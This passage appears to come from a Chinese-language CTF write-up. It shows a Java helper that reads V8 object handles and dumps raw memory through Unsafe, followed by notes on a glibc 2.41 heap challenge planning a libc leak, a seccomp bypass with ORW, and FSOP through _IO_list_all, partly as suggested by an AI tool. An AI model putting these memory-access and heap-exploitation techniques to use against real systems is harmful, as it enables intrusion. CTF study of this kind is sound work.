    private static long nativeHandleOf(Object obj) {
        if (!(obj instanceof V8Value)) {
            throw new IllegalArgumentException("addr() expects a V8 object/value");
        }
        try {
            Field f = V8Value.class.getDeclaredField("objectHandle");
            f.setAccessible(true);
            return f.getLong(obj);
        } catch (Exception e) {
            throw new RuntimeException("failed to read V8Value.objectHandle", e);
        }
    }

    private static long parseAddr(String text) {
        String s = text.trim().toLowerCase(Locale.ROOT);
        if (s.startsWith("0x")) {
            s = s.substring(2);
        }
        if (s.isEmpty()) {
            return 0L;
        }
        return Long.parseUnsignedLong(s, 16);
    }

    private static int parseSize(String text) {
        String s = text.trim().toLowerCase(Locale.ROOT);
        if (s.startsWith("0x")) {
            return Integer.parseUnsignedInt(s.substring(2), 16);
        }
        return Integer.parseInt(s);
    }

    private static String hex(long value) {
        return "0x" + Long.toUnsignedString(value, 16);
    }

    private static String dump(long addr, int size) {
        StringBuilder sb = new StringBuilder();
        for (int off = 0; off < size; off += 16) {
            sb.append(hex(addr + off)).append(": ");
            for (int i = 0; i < 16 && off + i < size; i++) {
                int b = UNSAFE.getByte(addr + off + i) & 0xff;
                if (i != 0) {
                    sb.append(' ');
                }
                if (b < 0x10) {
                    sb.append('0');
                }
                sb.append(Integer.toHexString(b));
            }
            if (off + 16 < size) {
                sb.append('\n');
            }
        }
        return sb.toString();
    }
}
```

### BOX
怎么还有java

## minivfs
这个是堆题，可以稍微能做了

先分析一下题目，这道题的glibc版本是 2.41

高版本libc下面，我们就不能简单的泄露然后利用几个hook就能达到利用的目的。这道题还是有点难

首先我们拿ai分析有这么一个东西


![](https://cdn.nlark.com/yuque/0/2026/png/58878864/1775054938192-7f3e8512-3812-476e-b872-78010b8b004f.png)

不过绕过这个之后，堆的部分利用思路还是首先需要泄露libc

有个沙箱那是要在栈上写ORW？


ai给的建议：

 由于 Glibc 2.41 没有 Hook，且存在 Seccomp 限制，直接 `system` 是死路一条。最稳妥的办法是劫持 `_IO_list_all` 执行 **FSOP (File Stream Oriented Programming)**